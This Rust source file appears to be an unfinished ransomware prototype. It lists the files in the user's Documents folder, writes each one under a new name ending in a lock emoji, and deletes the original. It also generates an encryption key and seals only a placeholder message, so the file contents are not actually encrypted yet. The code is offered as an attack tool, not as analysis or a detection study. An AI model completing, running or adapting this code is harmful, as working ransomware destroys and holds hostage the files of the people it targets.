use dirs::home_dir;
use std::fs;
use std::path::PathBuf;
use std::io::prelude::*;
use anyhow::Result;
use orion::aead;

const ENCRYPTED_EXTENSION: &str	= ".🔒";

fn encrypt_file(path: PathBuf) -> Result<()> {
	let file_name = path.file_name().unwrap().to_string_lossy();

	if !file_name.ends_with(ENCRYPTED_EXTENSION) {
		let mut file = fs::File::open(&path)?;
	
		let mut contents = Vec::new();
		file.read_to_end(&mut contents)?;

		let encrypted_path =
			PathBuf::from(format!("{}{}", path.display(), ENCRYPTED_EXTENSION));
		fs::write(&encrypted_path, &contents[..])?;

		fs::remove_file(&path)?;

		let secret_key = aead::SecretKey::generate(256)?;
		let ciphertext = aead::seal(&secret_key, b"Secret message")?;
		//let decrypted_data = aead::open(&secret_key, &ciphertext)?;
	}

	Ok(())
}

fn main() -> Result<()> {
	let target_dir = format!(
		"{}\\Documents",
		home_dir().unwrap_or("~".into()).to_string_lossy()
	);
	println!("{}", target_dir);

	let entries = fs::read_dir(target_dir)?;
	for entry in entries {
		let path = entry?.path();

		if path.is_file() {
			encrypt_file(path)?;
		}
	}

	Ok(())
}
